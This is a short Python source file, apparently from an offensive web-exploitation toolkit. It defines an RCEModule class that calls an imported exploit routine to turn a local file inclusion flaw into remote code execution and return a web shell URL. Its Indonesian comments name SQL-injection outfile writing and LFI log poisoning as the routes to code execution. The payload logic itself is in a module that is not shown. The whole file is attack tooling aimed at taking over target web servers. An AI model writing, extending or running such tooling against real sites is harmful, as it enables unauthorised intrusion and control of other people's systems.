class RCEModule:
    def __init__(self, target_url, proxy=None):
        from core.exploit import Exploit
        self.exploit = Exploit(target_url, proxy)
    
    def run(self, param, lfi_param=None):
        # Coba RCE via SQLi outfile (perlu parameter SQLi sebelumnya)
        # Atau via LFI poisoning
        if lfi_param:
            shell = self.exploit.lfi_to_rce(lfi_param)
            return {"vulnerable": True, "shell_url": shell}
        return None
